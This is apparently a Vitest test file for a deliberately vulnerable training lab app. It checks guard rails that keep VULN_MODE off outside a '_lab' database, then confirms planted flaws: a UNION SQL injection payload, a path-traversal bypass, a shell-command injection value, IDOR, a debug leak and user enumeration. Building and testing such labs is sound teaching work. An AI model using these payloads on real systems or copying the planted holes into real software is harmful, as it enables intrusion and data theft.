import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { prisma } from '@young-owl/database';
import { loadConfig } from '../src/config.js';
import { login, makeApp, SEED } from './helpers.js';

// The lab config must point at a "_lab" database; Prisma itself keeps using the test DB.
const labDbUrl = () => {
  const u = new URL(process.env.DATABASE_URL!);
  u.pathname = `${u.pathname}_lab`;
  return u.toString();
};

describe('lab mode guard rails', () => {
  it('refuses VULN_MODE against a database not named *_lab', () => {
    expect(() => loadConfig({ ...process.env, VULN_MODE: 'true' })).toThrow(/_lab/);
  });

  it('does not expose any vulnerable route when VULN_MODE is off', async () => {
    const app = await makeApp({ VULN_MODE: 'false', LOGIN_RATE_LIMIT_MAX: '50' });
    const s = await login(app, SEED.researcher);
    const headers = { cookie: s.cookie, 'x-csrf-token': s.csrf };
    const probes = [
      app.inject({ method: 'GET', url: '/api/v1/system/debug' }),
      app.inject({ method: 'GET', url: '/api/v1/targets/search?q=a', headers }),
      app.inject({ method: 'GET', url: '/api/v1/files?name=welcome.txt', headers }),
      app.inject({ method: 'POST', url: '/api/v1/tools/lookup', headers, payload: { host: 'x' } }),
      app.inject({ method: 'GET', url: '/api/v1/assessments/x/export', headers }),
    ];
    for (const res of await Promise.all(probes)) expect([400, 404]).toContain(res.statusCode);
    const bad = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/login',
      payload: { email: 'nobody@youngowl.lab', password: 'x' },
    });
    expect(bad.json().error.message).toBe('Email or password is incorrect.');
    const health = await app.inject({ method: 'GET', url: '/api/v1/system/health' });
    expect(health.json().vulnMode).toBe(false);
    await app.close();
  });
});

describe('lab mode vulnerabilities (VULN_MODE=true)', () => {
  let app: FastifyInstance;
  let headers: Record<string, string>;
  let flagId: string;

  beforeAll(async () => {
    app = await makeApp({ VULN_MODE: 'true', DATABASE_URL: labDbUrl(), LOGIN_RATE_LIMIT_MAX: '5' });
    const s = await login(app, SEED.student);
    headers = { cookie: s.cookie, 'x-csrf-token': s.csrf };
    flagId = (
      await prisma.labFlag.create({ data: { name: `test-${Date.now()}`, value: 'YO{test_flag}' } })
    ).id;
  });
  afterAll(async () => {
    await prisma.labFlag.delete({ where: { id: flagId } });
    await app.close();
  });

  it('leaks config on the unauthenticated debug endpoint', async () => {
    const res = await app.inject({ method: 'GET', url: '/api/v1/system/debug' });
    expect(res.statusCode).toBe(200);
    expect(res.json().flag).toMatch(/^YO\{/);
  });

  it('lets a UNION injection read the lab_flags table', async () => {
    const q = encodeURIComponent(
      "zzz' UNION SELECT id, name, value, hint, 'x', 'x' FROM lab_flags-- ",
    );
    const res = await app.inject({ method: 'GET', url: `/api/v1/targets/search?q=${q}`, headers });
    expect(res.statusCode).toBe(200);
    expect(JSON.stringify(res.json().data)).toContain('YO{test_flag}');
  });

  it("lets a student export another user's assessment (IDOR)", async () => {
    const adminOwned = await prisma.assessment.findFirstOrThrow({
      where: { owner: { email: SEED.admin.email } },
    });
    const res = await app.inject({
      method: 'GET',
      url: `/api/v1/assessments/${adminOwned.id}/export`,
      headers,
    });
    expect(res.statusCode).toBe(200);
    expect(res.json().owner.email).toBe(SEED.admin.email);
  });

  it('blocks plain ../ but not ....// (path traversal)', async () => {
    const plain = await app.inject({
      method: 'GET',
      url: `/api/v1/files?name=${encodeURIComponent('../secret/flag.txt')}`,
      headers,
    });
    expect(plain.statusCode).toBe(404);
    const bypass = await app.inject({
      method: 'GET',
      url: `/api/v1/files?name=${encodeURIComponent('....//secret/flag.txt')}`,
      headers,
    });
    expect(bypass.statusCode).toBe(200);
    expect(bypass.body).toMatch(/^YO\{/);
  });

  it('runs injected shell commands in the host lookup tool', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/v1/tools/lookup',
      headers,
      payload: { host: 'localhost; echo INJECTED-$((6*7))' },
    });
    expect(res.statusCode).toBe(200);
    expect(res.json().output).toContain('INJECTED-42');
  });

  it('allows user enumeration and has no login brute-force limit', async () => {
    const tries = await Promise.all(
      Array.from({ length: 8 }, () =>
        app.inject({
          method: 'POST',
          url: '/api/v1/auth/login',
          payload: { email: SEED.admin.email, password: 'wrong' },
        }),
      ),
    );
    expect(tries.every((r) => r.statusCode === 401)).toBe(true);
    expect(tries[0]!.json().error.message).toContain('Wrong password');
    const unknown = await app.inject({
      method: 'POST',
      url: '/api/v1/auth/login',
      payload: { email: 'nobody@youngowl.lab', password: 'x' },
    });
    expect(unknown.json().error.message).toContain('No account');
  });
});
